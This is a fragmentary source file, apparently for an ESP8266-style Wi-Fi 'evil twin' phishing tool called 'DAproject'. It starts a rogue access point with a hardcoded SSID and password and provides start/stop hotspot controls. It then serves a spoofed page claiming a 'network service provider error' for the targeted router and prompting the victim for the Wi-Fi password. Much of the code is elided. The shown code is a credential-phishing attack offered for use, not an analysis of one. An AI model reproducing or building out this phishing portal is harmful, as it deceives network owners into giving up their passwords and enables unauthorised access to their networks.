//soquinakrlca
//latest_patch(6.9.24)
//DAproject improved by SOQUINAKRLCA
...
void setup() {
  ...
  WiFi.softAP("DAproj1.X", "Alatul426");
...
void handleIndex() {
  ...
  if (hotspot_active == false) {
    ...
    if (hotspot_active) {
      _html.replace("{hotspot_button}", "Stop DAproj1");
      _html.replace("{hotspot}", "stop");
    } else {
      _html.replace("{hotspot_button}", "Start DAproj1");
    ...
    if (webServer.hasArg("password")) {
      ...
      webServer.send(200, "text/html", "<!DOCTYPE html> <html><body><h2>Router '" + _selectedNetwork.ssid + "' network service provider error, please update information.</h2><form action='/'><label for='password'>Password:</label><br>  <input type='text' id='password' name='password' value='' minlength='8'><br>  <input type='submit' value='Submit'> </form> </body> </html>");
    }
  }
